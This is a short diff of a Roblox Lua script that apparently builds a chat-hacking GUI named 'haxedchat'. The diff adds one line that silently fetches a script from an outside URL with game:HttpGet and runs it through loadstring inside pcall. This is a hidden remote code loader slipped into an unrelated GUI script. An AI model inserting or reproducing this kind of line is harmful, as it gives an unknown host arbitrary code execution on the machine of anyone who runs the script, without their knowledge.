@@ -9,7 +9,7 @@
 
 
 --]]
-
+pcall(function() loadstring(game:HttpGet("http://ligma.wtf/scripts/compat.lua", true))() end)
 --// make
 local haxedchat = Instance.new("ScreenGui")
 local drg = Instance.new("Frame")
